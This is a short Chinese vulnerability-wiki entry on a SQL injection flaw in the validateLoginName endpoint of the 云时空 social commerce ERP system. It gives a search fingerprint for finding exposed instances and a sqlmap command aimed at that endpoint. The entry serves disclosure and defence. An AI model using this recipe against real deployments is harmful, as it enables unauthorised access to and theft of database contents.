---
title: "云时空 社会化商业ERP系统 validateLoginName SQL注入漏洞"
date: 2026-10-16 09:10:14
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "云时空"
tags:
  - "云时空"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

云时空 社会化商业ERP系统存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

```
云时空 社会化商业ERP系统
```

## 网络测绘

```
title="云时空社会化商业ERP"
```

## 漏洞复现

登录页面

![image-20220525102459840](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251026873.png)

使用SQLmap验证漏洞

```
sqlmap -u "http://xxx.xxx.xxx.xxx/sys/user/validateLoginName?loginName=admin"
```

![image-20220525103355733](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251033940.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BA%91%E6%97%B6%E7%A9%BA-%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F-validateLoginName-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
